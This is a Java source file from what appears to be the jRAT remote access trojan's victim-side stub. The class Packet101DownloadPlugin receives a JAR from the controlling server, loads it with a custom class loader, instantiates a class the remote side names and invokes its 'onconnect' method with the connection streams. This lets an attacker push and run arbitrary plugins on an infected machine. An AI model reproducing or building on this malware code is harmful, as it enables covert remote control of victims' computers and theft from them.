package io.jrat.stub.packets.incoming;

import io.jrat.common.io.FileCache;
import io.jrat.common.io.TransferData;
import io.jrat.stub.Connection;
import io.jrat.stub.Plugin;
import io.jrat.stub.PluginClassLoader;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.util.jar.JarInputStream;

public class Packet101DownloadPlugin extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String mainClass = con.readLine();
		String name = con.readLine();

		TransferData data = FileCache.get(name);

		InputStream is = new ByteArrayInputStream(((ByteArrayOutputStream) data.getOutputStream()).toByteArray());
		JarInputStream jis = new JarInputStream(is);
		ClassLoader cl = new PluginClassLoader(this.getClass().getClassLoader(), jis);
		is.close();
		jis.close();

		FileCache.remove(data);

		try {
			Plugin p = new Plugin();

			Class<?> clazz = Class.forName(mainClass, true, cl);
			p.instance = clazz.newInstance();

			Plugin.addMethods(p, clazz);

			Plugin.list.add(p);
			
			p.methods.get("onconnect").invoke(p.instance, new Object[] { con.getDataInputStream(), con.getDataOutputStream() });
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
}
